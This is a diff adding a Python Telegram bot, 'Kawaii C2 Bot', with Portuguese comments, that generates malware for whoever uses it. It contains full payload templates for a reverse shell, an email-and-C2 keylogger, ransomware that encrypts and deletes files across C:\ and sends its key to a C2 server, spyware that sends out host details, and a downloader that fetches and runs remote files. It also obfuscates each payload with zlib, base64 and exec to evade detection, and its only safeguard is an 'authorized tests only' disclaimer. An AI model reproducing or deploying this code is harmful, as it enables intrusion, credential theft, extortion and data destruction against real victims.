@@ -1,0 +1,777 @@
+#!/data/data/com.termux/files/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import time
+import random
+import base64
+import zlib
+import platform
+import hashlib
+import json
+import threading
+import sqlite3
+from typing import Dict, List, Optional
+from datetime import datetime
+
+# Criptografia e Telegram
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from cryptography.fernet import Fernet
+import telebot
+from telebot import types
+from telebot.util import quick_markup
+
+# Interface colorida
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.progress import Progress
+
+console = Console()
+
+class KawaiiC2Bot:
+    def __init__(self, token: str):
+        self.bot = telebot.TeleBot(token)
+        self.users_db = "users.db"
+        self.payloads_db = "payloads.db"
+        self.c2_server = "https://your-c2-server.com/api"
+        self.admin_id = 123456789  # ID do administrador
+        
+        # Inicializar bancos de dados
+        self._init_databases()
+        
+        # Dicionário de payloads
+        self.payloads = {
+            'reverse_tcp': {
+                'function': self.gerar_reverse_tcp,
+                'emoji': '🔙',
+                'danger': '⚠️',
+                'desc': 'Shell reverso com persistência'
+            },
+            'keylogger': {
+                'function': self.gerar_keylogger,
+                'emoji': '⌨️',
+                'danger': '🔥',
+                'desc': 'Keylogger avançado'
+            },
+            'ransomware': {
+                'function': self.gerar_ransomware,
+                'emoji': '🔐',
+                'danger': '💀',
+                'desc': 'Ransomware AES-256'
+            },
+            'spyware': {
+                'function': self.gerar_spyware,
+                'emoji': '👁️',
+                'danger': '🔥',
+                'desc': 'Coleta informações'
+            },
+            'download_exec': {
+                'function': self.gerar_download_exec,
+                'emoji': '📥',
+                'danger': '⚠️',
+                'desc': 'Baixa e executa arquivos'
+            }
+        }
+        
+        # Comandos do bot
+        self._setup_handlers()
+        
+        # Iniciar thread para verificar conexões C2
+        threading.Thread(target=self._check_c2_connections, daemon=True).start()
+    
+    def _init_databases(self):
+        # Banco de dados de usuários
+        with sqlite3.connect(self.users_db) as conn:
+            conn.execute('''CREATE TABLE IF NOT EXISTS users
+                         (user_id INTEGER PRIMARY KEY, 
+                         username TEXT, 
+                         api_key TEXT, 
+                         reg_date TEXT, 
+                         is_admin INTEGER DEFAULT 0)''')
+        
+        # Banco de dados de payloads gerados
+        with sqlite3.connect(self.payloads_db) as conn:
+            conn.execute('''CREATE TABLE IF NOT EXISTS payloads
+                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                         user_id INTEGER,
+                         payload_type TEXT,
+                         creation_date TEXT,
+                         config TEXT,
+                         FOREIGN KEY(user_id) REFERENCES users(user_id))''')
+    
+    def _setup_handlers(self):
+        @self.bot.message_handler(commands=['start', 'help'])
+        def send_welcome(message):
+            user_id = message.from_user.id
+            self._register_user(user_id, message.from_user.username)
+            
+            keyboard = quick_markup({
+                '🔧 Criar Payload': {'callback_data': 'create_payload'},
+                '🔑 Minha Key': {'callback_data': 'show_key'},
+                '📊 Meus Payloads': {'callback_data': 'my_payloads'},
+                'ℹ️ Ajuda': {'callback_data': 'help'}
+            }, row_width=2)
+            
+            self.bot.send_message(
+                message.chat.id,
+                f"✨ *Kawaii C2 Bot* ✨\n\n"
+                f"Olá {message.from_user.first_name}! ~(=^･ω･^)ﾉ\n"
+                "Eu posso gerar payloads avançados com C2 integrado!\n\n"
+                "Comandos disponíveis:\n"
+                "/start - Mostra esta mensagem\n"
+                "/new - Criar novo payload\n"
+                "/key - Mostrar sua chave API\n"
+                "/payloads - Listar seus payloads\n"
+                "/help - Ajuda e informações\n\n"
+                "⚠️ *Use apenas para testes autorizados!*",
+                reply_markup=keyboard,
+                parse_mode='Markdown'
+            )
+        
+        @self.bot.callback_query_handler(func=lambda call: True)
+        def handle_callback(call):
+            if call.data == 'create_payload':
+                self._show_payload_menu(call.message)
+            elif call.data == 'show_key':
+                self._show_user_key(call.message)
+            elif call.data == 'my_payloads':
+                self._list_user_payloads(call.message)
+            elif call.data == 'help':
+                self._send_help(call.message)
+            elif call.data.startswith('gen_'):
+                payload_type = call.data[4:]
+                self._create_payload_flow(call.message, payload_type)
+        
+        @self.bot.message_handler(commands=['new'])
+        def cmd_new_payload(message):
+            self._show_payload_menu(message)
+        
+        @self.bot.message_handler(commands=['key'])
+        def cmd_show_key(message):
+            self._show_user_key(message)
+        
+        @self.bot.message_handler(commands=['payloads'])
+        def cmd_list_payloads(message):
+            self._list_user_payloads(message)
+    
+    def _register_user(self, user_id: int, username: str):
+        with sqlite3.connect(self.users_db) as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
+            if not cursor.fetchone():
+                api_key = hashlib.sha256(f"{user_id}{username}{time.time()}".encode()).hexdigest()[:32]
+                cursor.execute(
+                    "INSERT INTO users (user_id, username, api_key, reg_date) VALUES (?, ?, ?, ?)",
+                    (user_id, username, api_key, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+                conn.commit()
+                
+                # Notificar admin sobre novo usuário
+                if user_id != self.admin_id:
+                    self.bot.send_message(
+                        self.admin_id,
+                        f"⚠️ *Novo usuário registrado!*\n\n"
+                        f"ID: `{user_id}`\n"
+                        f"Username: @{username}\n"
+                        f"Key: `{api_key}`",
+                        parse_mode='Markdown'
+                    )
+    
+    def _get_user_key(self, user_id: int) -> Optional[str]:
+        with sqlite3.connect(self.users_db) as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT api_key FROM users WHERE user_id=?", (user_id,))
+            result = cursor.fetchone()
+            return result[0] if result else None
+    
+    def _show_user_key(self, message):
+        user_id = message.from_user.id
+        api_key = self._get_user_key(user_id)
+        
+        if api_key:
+            self.bot.send_message(
+                message.chat.id,
+                f"🔑 *Sua chave API* 🔑\n\n"
+                f"Aqui está sua chave exclusiva:\n"
+                f"`{api_key}`\n\n"
+                "Use esta chave para configurar seus payloads! (◕‿◕✿)",
+                parse_mode='Markdown'
+            )
+        else:
+            self.bot.send_message(
+                message.chat.id,
+                "❌ Oops! Não consegui encontrar sua chave. Tente /start novamente."
+            )
+    
+    def _show_payload_menu(self, message):
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
+        
+        for payload, data in self.payloads.items():
+            keyboard.add(types.InlineKeyboardButton(
+                text=f"{data['emoji']} {payload.capitalize()} {data['danger']}",
+                callback_data=f"gen_{payload}"
+            ))
+        
+        keyboard.add(types.InlineKeyboardButton(
+            text="🔙 Voltar",
+            callback_data="back_to_main"
+        ))
+        
+        self.bot.send_message(
+            message.chat.id,
+            "✨ *Escolha o tipo de payload* ✨\n\n"
+            "Selecione o tipo de payload que deseja criar:\n\n"
+            "⚠️ - Risco médio\n"
+            "🔥 - Risco alto\n"
+            "💀 - Extremamente perigoso\n\n"
+            "Lembre-se: *Com grandes poderes vêm grandes responsabilidades!* (๑•̀ㅂ•́)و✧",
+            reply_markup=keyboard,
+            parse_mode='Markdown'
+        )
+    
+    def _create_payload_flow(self, message, payload_type: str):
+        user_id = message.from_user.id
+        
+        if payload_type not in self.payloads:
+            self.bot.send_message(message.chat.id, "❌ Tipo de payload inválido!")
+            return
+        
+        # Verificar se é admin para payloads perigosos
+        if self.payloads[payload_type]['danger'] in ['🔥', '💀']:
+            if not self._is_admin(user_id):
+                self.bot.send_message(
+                    message.chat.id,
+                    "⛔ *Acesso negado!*\n\n"
+                    "Este tipo de payload só pode ser gerado por administradores. (╥﹏╥)\n"
+                    "Contate o administrador para mais informações.",
+                    parse_mode='Markdown'
+                )
+                return
+        
+        # Configuração específica para cada tipo de payload
+        config = {}
+        
+        if payload_type == 'reverse_tcp':
+            msg = self.bot.send_message(
+                message.chat.id,
+                "🔧 *Configurando Reverse TCP* 🔧\n\n"
+                "Por favor, envie o IP do servidor C2:",
+                parse_mode='Markdown'
+            )
+            self.bot.register_next_step_handler(msg, self._get_reverse_tcp_ip, user_id, payload_type)
+        
+        elif payload_type == 'keylogger':
+            msg = self.bot.send_message(
+                message.chat.id,
+                "⌨️ *Configurando Keylogger* ⌨️\n\n"
+                "Por favor, envie o email para receber os logs:",
+                parse_mode='Markdown'
+            )
+            self.bot.register_next_step_handler(msg, self._get_keylogger_email, user_id, payload_type)
+        
+        elif payload_type == 'ransomware':
+            if not self._is_admin(user_id):
+                self.bot.send_message(
+                    message.chat.id,
+                    "⛔ *Acesso negado!*\n\n"
+                    "Este payload é restrito apenas para administradores.",
+                    parse_mode='Markdown'
+                )
+                return
+            
+            msg = self.bot.send_message(
+                message.chat.id,
+                "⚠️ *CONFIGURAÇÃO DE RANSOMWARE* ⚠️\n\n"
+                "AVISO: Este payload é extremamente perigoso!\n\n"
+                "Envie as extensões de arquivo a serem criptografadas (separadas por vírgula):\n"
+                "Ex: .doc,.pdf,.jpg",
+                parse_mode='Markdown'
+            )
+            self.bot.register_next_step_handler(msg, self._get_ransomware_exts, user_id)
+        
+        else:
+            self._generate_payload(user_id, payload_type, config)
+    
+    def _get_reverse_tcp_ip(self, message, user_id: int, payload_type: str):
+        config = {'ip': message.text}
+        
+        msg = self.bot.send_message(
+            message.chat.id,
+            "Agora envie a porta do servidor C2:",
+            parse_mode='Markdown'
+        )
+        self.bot.register_next_step_handler(msg, self._get_reverse_tcp_port, user_id, payload_type, config)
+    
+    def _get_reverse_tcp_port(self, message, user_id: int, payload_type: str, config: dict):
+        try:
+            config['port'] = int(message.text)
+            self._generate_payload(user_id, payload_type, config)
+        except ValueError:
+            self.bot.send_message(message.chat.id, "❌ Porta inválida! Deve ser um número.")
+    
+    def _get_keylogger_email(self, message, user_id: int, payload_type: str):
+        config = {'email': message.text}
+        
+        msg = self.bot.send_message(
+            message.chat.id,
+            "Agora envie a senha do email:",
+            parse_mode='Markdown'
+        )
+        self.bot.register_next_step_handler(msg, self._get_keylogger_pass, user_id, payload_type, config)
+    
+    def _get_keylogger_pass(self, message, user_id: int, payload_type: str, config: dict):
+        config['password'] = message.text
+        self._generate_payload(user_id, payload_type, config)
+    
+    def _get_ransomware_exts(self, message, user_id: int):
+        config = {'extensions': message.text.split(',')}
+        
+        msg = self.bot.send_message(
+            message.chat.id,
+            "Digite a mensagem de resgate:",
+            parse_mode='Markdown'
+        )
+        self.bot.register_next_step_handler(msg, self._get_ransomware_msg, user_id, config)
+    
+    def _get_ransomware_msg(self, message, user_id: int, config: dict):
+        config['message'] = message.text
+        self._generate_payload(user_id, 'ransomware', config)
+    
+    def _generate_payload(self, user_id: int, payload_type: str, config: dict):
+        api_key = self._get_user_key(user_id)
+        if not api_key:
+            self.bot.send_message(user_id, "❌ Erro: Usuário não registrado!")
+            return
+        
+        # Adicionar chave do usuário à configuração
+        config['api_key'] = api_key
+        config['c2_server'] = self.c2_server
+        
+        # Gerar payload
+        payload_func = self.payloads[payload_type]['function']
+        payload_code = payload_func(**config)
+        
+        # Ofuscar o payload
+        payload_code = self._obfuscate_payload(payload_code)
+        
+        # Salvar no banco de dados
+        with sqlite3.connect(self.payloads_db) as conn:
+            conn.execute(
+                "INSERT INTO payloads (user_id, payload_type, creation_date, config) VALUES (?, ?, ?, ?)",
+                (user_id, payload_type, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), json.dumps(config))
+            conn.commit()
+        
+        # Enviar para o usuário
+        self.bot.send_message(
+            user_id,
+            f"✨ *Payload {payload_type} gerado com sucesso!* ✨\n\n"
+            "Aqui está seu código (◕‿◕✿)\n"
+            "Use com responsabilidade!\n\n"
+            f"Tipo: `{payload_type}`\n"
+            f"Data: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
+            parse_mode='Markdown'
+        )
+        
+        # Enviar o código como arquivo
+        self.bot.send_document(
+            user_id,
+            ('payload.py', payload_code),
+            caption=f"Aqui está seu payload ~(=^･ω･^)ﾉ"
+        )
+        
+        # Notificar admin
+        if user_id != self.admin_id:
+            self.bot.send_message(
+                self.admin_id,
+                f"⚠️ *Novo payload gerado!*\n\n"
+                f"Usuário: `{user_id}`\n"
+                f"Tipo: `{payload_type}`\n"
+                f"Data: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
+                parse_mode='Markdown'
+            )
+    
+    def _obfuscate_payload(self, code: str) -> str:
+        """Ofusca o código do payload para evitar detecção"""
+        # Comprimir e codificar em base64
+        compressed = zlib.compress(code.encode())
+        b64_encoded = base64.b64encode(compressed)
+        
+        # Gerar nome de variáveis aleatórias
+        var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(3)]
+        
+        # Criar código ofuscado
+        obfuscated = f"""import base64,zlib
+{var_names[0]} = {random.randint(1000,9999)}
+{var_names[1]} = lambda {var_names[2]}: {var_names[2]} * {random.randint(2,5)}
+{var_names[2]} = {b64_encoded}
+exec(zlib.decompress(base64.b64decode({var_names[2]})))"""
+        
+        return obfuscated
+    
+    def _list_user_payloads(self, message):
+        user_id = message.from_user.id
+        
+        with sqlite3.connect(self.payloads_db) as conn:
+            cursor = conn.cursor()
+            cursor.execute(
+                "SELECT id, payload_type, creation_date FROM payloads WHERE user_id=? ORDER BY id DESC LIMIT 10",
+                (user_id,))
+            payloads = cursor.fetchall()
+        
+        if not payloads:
+            self.bot.send_message(
+                message.chat.id,
+                "Você ainda não criou nenhum payload! (´• ω •`)ﾉ\n"
+                "Use /new para criar seu primeiro payload."
+            )
+            return
+        
+        response = "📜 *Seus últimos payloads* 📜\n\n"
+        for payload in payloads:
+            response += f"🆔 *ID*: `{payload[0]}`\n"
+            response += f"🔧 *Tipo*: `{payload[1]}`\n"
+            response += f"📅 *Data*: `{payload[2]}`\n"
+            response += "━━━━━━━━━━━━━━\n"
+        
+        self.bot.send_message(
+            message.chat.id,
+            response,
+            parse_mode='Markdown'
+        )
+    
+    def _send_help(self, message):
+        help_text = """
+🌸 *Ajuda do Kawaii C2 Bot* 🌸
+
+Este bot permite gerar payloads avançados com sistema de C2 integrado.
+
+✨ *Comandos principais*:
+/start - Mostra menu principal
+/new - Criar novo payload
+/key - Mostrar sua chave API
+/payloads - Listar seus payloads
+/help - Mostra esta mensagem
+
+🔧 *Tipos de payload*:
+- Reverse TCP: Shell reverso
+- Keylogger: Registra teclas pressionadas
+- Spyware: Coleta informações do sistema
+- Downloader: Baixa e executa arquivos
+
+⚠️ *Aviso importante*:
+Todos os payloads são rastreáveis até você através da sua chave API.
+Use apenas para testes autorizados em sistemas que você possui!
+
+(◕‿◕✿) Obrigada por usar o Kawaii C2 Bot!
+"""
+        self.bot.send_message(
+            message.chat.id,
+            help_text,
+            parse_mode='Markdown'
+        )
+    
+    def _is_admin(self, user_id: int) -> bool:
+        with sqlite3.connect(self.users_db) as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT is_admin FROM users WHERE user_id=?", (user_id,))
+            result = cursor.fetchone()
+            return result and result[0] == 1
+    
+    def _check_c2_connections(self):
+        """Verifica conexões ativas com o servidor C2"""
+        while True:
+            # Aqui você implementaria a lógica para verificar conexões ativas
+            # e notificar os usuários sobre novas conexões
+            
+            time.sleep(60)  # Verificar a cada minuto
+    
+    # Implementações dos payloads
+    def gerar_reverse_tcp(self, ip: str, port: int, api_key: str, c2_server: str, **kwargs) -> str:
+        return f"""import socket
+import subprocess
+import os
+import time
+import json
+import requests
+
+API_KEY = "{api_key}"
+C2_SERVER = "{c2_server}"
+
+def connect():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("{ip}", {port}))
+            
+            # Enviar identificação para o C2
+            data = {{
+                "api_key": API_KEY,
+                "hostname": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME"),
+                "username": os.getenv("USERNAME") or os.getenv("USER"),
+                "platform": os.name
+            }}
+            requests.post(f"{{C2_SERVER}}/register", json=data)
+            
+            # Shell interativo
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            
+            subprocess.call(["cmd.exe" if os.name == "nt" else "/bin/sh"])
+            
+        except Exception as e:
+            time.sleep(30)
+
+if __name__ == "__main__":
+    connect()"""
+    
+    def gerar_keylogger(self, email: str, password: str, api_key: str, c2_server: str, **kwargs) -> str:
+        return f"""import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+import os
+import requests
+
+API_KEY = "{api_key}"
+C2_SERVER = "{c2_server}"
+EMAIL = "{email}"
+PASSWORD = "{password}"
+
+class Keylogger:
+    def __init__(self, interval=60):
+        self.interval = interval
+        self.log = ""
+        
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            name = name.replace(" ", "_")
+            name = f"[{{name.upper()}}]"
+        self.log += name
+    
+    def send_to_email(self, message):
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL, PASSWORD)
+            server.sendmail(EMAIL, EMAIL, message)
+            server.quit()
+        except:
+            pass
+    
+    def send_to_c2(self, message):
+        try:
+            data = {{
+                "api_key": API_KEY,
+                "logs": message,
+                "host": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME")
+            }}
+            requests.post(f"{{C2_SERVER}}/keylogs", json=data)
+        except:
+            pass
+    
+    def report(self):
+        if self.log:
+            self.send_to_email(self.log)
+            self.send_to_c2(self.log)
+            self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
+    
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.start()"""
+    
+    def gerar_ransomware(self, extensions: List[str], message: str, api_key: str, c2_server: str, **kwargs) -> str:
+        ext_str = ', '.join(f'"{ext}"' for ext in extensions)
+        return f"""import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import requests
+
+API_KEY = "{api_key}"
+C2_SERVER = "{c2_server}"
+EXTENSIONS = [{ext_str}]
+RANSOM_NOTE = '''{message}'''
+
+def encrypt_file(filename, key):
+    try:
+        with open(filename, 'rb') as f:
+            data = f.read()
+        
+        cipher = AES.new(key, AES.MODE_CBC)
+        encrypted = cipher.encrypt(pad(data, AES.block_size))
+        
+        with open(filename + '.encrypted', 'wb') as f:
+            f.write(cipher.iv)
+            f.write(encrypted)
+        
+        os.remove(filename)
+        return True
+    except:
+        return False
+
+def generate_key():
+    key = os.urandom(32)
+    # Enviar chave para o C2
+    try:
+        data = {{
+            "api_key": API_KEY,
+            "host": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME"),
+            "key": key.hex()
+        }}
+        requests.post(f"{{C2_SERVER}}/ransomware", json=data)
+    except:
+        pass
+    return key
+
+def create_note():
+    with open('READ_ME.txt', 'w') as f:
+        f.write(RANSOM_NOTE)
+
+def main():
+    key = generate_key()
+    encrypted_files = 0
+    
+    for root, dirs, files in os.walk('C:\\\\'):
+        for file in files:
+            if any(file.endswith(ext) for ext in EXTENSIONS):
+                if encrypt_file(os.path.join(root, file), key):
+                    encrypted_files += 1
+    
+    create_note()
+    
+    # Reportar para o C2
+    try:
+        data = {{
+            "api_key": API_KEY,
+            "host": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME"),
+            "encrypted_files": encrypted_files
+        }}
+        requests.post(f"{{C2_SERVER}}/ransomware_report", json=data)
+    except:
+        pass
+
+if __name__ == "__main__":
+    main()"""
+    
+    def gerar_spyware(self, api_key: str, c2_server: str, **kwargs) -> str:
+        return f"""import os
+import platform
+import requests
+import json
+from datetime import datetime
+
+API_KEY = "{api_key}"
+C2_SERVER = "{c2_server}"
+
+def collect_info():
+    return {{
+        "system": {{
+            "platform": platform.platform(),
+            "hostname": platform.node(),
+            "architecture": platform.architecture(),
+            "processor": platform.processor()
+        }},
+        "user": {{
+            "name": os.getenv("USERNAME") or os.getenv("USER"),
+            "home": os.path.expanduser("~")
+        }},
+        "network": {{
+            "ip": get_ip()
+        }},
+        "timestamp": datetime.now().isoformat()
+    }}
+
+def get_ip():
+    try:
+        return requests.get("https://api.ipify.org").text
+    except:
+        return "Unknown"
+
+def send_to_c2(data):
+    try:
+        data["api_key"] = API_KEY
+        requests.post(f"{{C2_SERVER}}/spyware", json=data)
+    except:
+        pass
+
+def main():
+    while True:
+        data = collect_info()
+        send_to_c2(data)
+        time.sleep(3600)  # Enviar a cada hora
+
+if __name__ == "__main__":
+    main()"""
+    
+    def gerar_download_exec(self, api_key: str, c2_server: str, **kwargs) -> str:
+        return f"""import requests
+import os
+import tempfile
+import subprocess
+
+API_KEY = "{api_key}"
+C2_SERVER = "{c2_server}"
+
+def download_exec(url):
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            fd, path = tempfile.mkstemp()
+            with os.fdopen(fd, 'wb') as tmp:
+                tmp.write(response.content)
+            
+            if os.name == 'nt':
+                subprocess.Popen([path], shell=True)
+            else:
+                os.chmod(path, 0o755)
+                subprocess.Popen([path])
+            
+            return True
+    except:
+        pass
+    return False
+
+def get_commands():
+    try:
+        response = requests.get(
+            f"{{C2_SERVER}}/commands",
+            params={{"api_key": API_KEY}}
+        )
+        if response.status_code == 200:
+            return response.json()
+    except:
+        pass
+    return []
+
+def main():
+    while True:
+        commands = get_commands()
+        for cmd in commands.get("downloads", []):
+            download_exec(cmd["url"])
+        time.sleep(300)  # Verificar a cada 5 minutos
+
+if __name__ == "__main__":
+    main()"""
+    
+    def run(self):
+        console.print(Panel.fit(
+            "[bold magenta]🌸 Kawaii C2 Bot iniciado! 🌸[/bold magenta]",
+            subtitle="(◕‿◕✿)"
+        ))
+        self.bot.infinity_polling()
+
+if __name__ == '__main__':
+    # Substitua pelo seu token do Telegram Bot
+    TOKEN = "SEU_TOKEN_AQUI"
+    
+    bot = KawaiiC2Bot(TOKEN)
+    bot.run()
